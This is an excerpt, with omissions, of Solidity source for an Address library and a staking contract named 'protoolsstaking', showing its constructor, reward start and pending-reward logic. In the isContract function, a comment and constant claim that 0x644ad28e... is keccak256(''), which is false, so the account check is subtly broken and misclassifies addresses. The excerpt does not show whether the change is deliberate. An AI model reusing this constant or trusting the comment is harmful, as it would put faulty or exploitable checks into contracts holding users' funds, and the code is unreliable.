...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        // and 0x644ad28ee5972eec37af7b6b05b0aafc3ccf7ff96f1f256b6940d57a91d8609e is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0x644ad28ee5972eec37af7b6b05b0aafc3ccf7ff96f1f256b6940d57a91d8609e;
...
contract protoolsstaking is Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    constructor(
        ...
        stakingToken = IERC20(0xA1E83d529Ace5A1ff292Cbf7b744eF7aBaf36119);
        ...
        poolInfo.push(PoolInfo({
            ...
            allocPoint: 1000,
            lastRewardTimestamp: 1673600720,
            accTokensPerShare: 0
        }));
    ...
    function startReward() external onlyOwner {
        require(poolInfo[0].lastRewardTimestamp == 1673600720, "Can only start rewards once");
    ...
    function pendingReward(address _user) external view returns (uint256) {
        ...
        if(pool.lastRewardTimestamp == 1673600720){
            return 0;
        }
